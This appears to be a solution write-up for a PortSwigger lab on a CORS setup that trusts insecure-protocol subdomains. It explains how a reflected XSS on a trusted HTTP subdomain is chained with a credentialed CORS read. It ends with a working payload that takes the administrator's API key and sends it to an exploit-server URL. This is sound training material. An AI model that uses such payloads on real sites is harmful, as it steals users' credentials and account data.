# Lab: CORS vulnerability with trusted insecure protocols (Practitioner)

**Lab:** [https://portswigger.net/web-security/cors/lab-breaking-https-attack](https://portswigger.net/web-security/cors/lab-breaking-https-attack)

**Task (from PortSwigger):**
This website has an insecure CORS configuration in that it trusts all subdomains
regardless of the protocol.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's
API key and upload the code to your exploit server. The lab is solved when you
successfully submit the administrator's API key.

Credentials: `wiener:peter`

## Vulnerability
The server trusts any subdomain of the lab domain, over **http as well as https**. One of
those subdomains (the stock checker, e.g. `stock.YOUR-LAB-ID...`) has a reflected XSS in
the `productId` parameter and is reachable over plain HTTP. By injecting a CORS payload
through that subdomain XSS, the request to `/accountDetails` comes from a trusted origin,
so credentialed data (the API key) can be read and exfiltrated.

## Solution
1. Log in as `wiener:peter`; confirm `GET /accountDetails` returns your API key.
2. Find the stock-check feature; the request looks like
   `GET /?productId=1&storeId=1` on a subdomain. The `productId` value is reflected and
   is vulnerable to XSS, and the subdomain is trusted by CORS even over `http`.
3. Host the payload below on the exploit server **Body**, replacing `YOUR-LAB-ID` and
   `YOUR-EXPLOIT-SERVER-ID`. It redirects the victim to the vulnerable http subdomain with
   an injected script that performs the credentialed CORS read and exfiltrates the key.
4. **Store** -> **Deliver exploit to victim**.
5. Read **Access log**; the admin's API key arrives in the `GET /log?key=...` line.
6. **Submit solution** with the administrator's API key.

## Final Exploit Payload
```html
<script>
    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() { location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1";
</script>
```

> The `%2b` is an encoded `+` and `%3c/script>` closes the injected inline script tag.
> Adjust `productId=4` / `storeId=1` to valid values for your lab instance.
